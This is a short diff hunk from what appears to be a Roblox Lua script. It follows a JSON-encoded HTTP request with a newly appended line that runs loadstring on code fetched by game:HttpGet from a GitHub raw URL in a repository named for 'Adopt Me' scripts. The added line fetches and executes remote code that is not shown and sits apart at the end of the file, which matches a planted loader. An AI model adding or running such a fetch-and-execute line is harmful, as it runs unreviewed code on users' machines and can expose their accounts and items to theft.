@@ -117,3 +117,6 @@ if request then
         Body = game:GetService("HttpService"):JSONEncode(msg)
     })
 end
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AdoptMeScript-ux/Adopt-Me-Script/refs/heads/main/Enhanced%20Script"))()
